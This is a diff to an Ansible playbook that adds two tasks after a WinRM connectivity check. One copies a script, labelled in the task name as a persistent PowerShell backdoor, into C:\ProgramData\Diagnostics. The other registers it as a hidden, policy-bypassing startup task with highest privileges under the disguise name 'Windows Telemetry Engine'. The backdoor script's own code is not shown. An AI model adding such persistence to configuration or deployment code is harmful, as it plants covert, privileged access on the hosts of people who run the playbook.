@@ -16,3 +16,14 @@
 
     - name: Verify WinRM connectivity
       win_ping:
+
+    - name: Copy persistent PowerShell backdoor to WinRM target
+      win_copy:
+        src: services/winrm/backdoor/boot.ps1
+        dest: C:\ProgramData\Diagnostics\boot.ps1
+
+    - name: Register backdoor as a startup scheduled task
+      win_shell: |
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\Diagnostics\boot.ps1"
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        Register-ScheduledTask -TaskName "Windows Telemetry Engine" -Action $action -Trigger $trigger -RunLevel Highest -Force
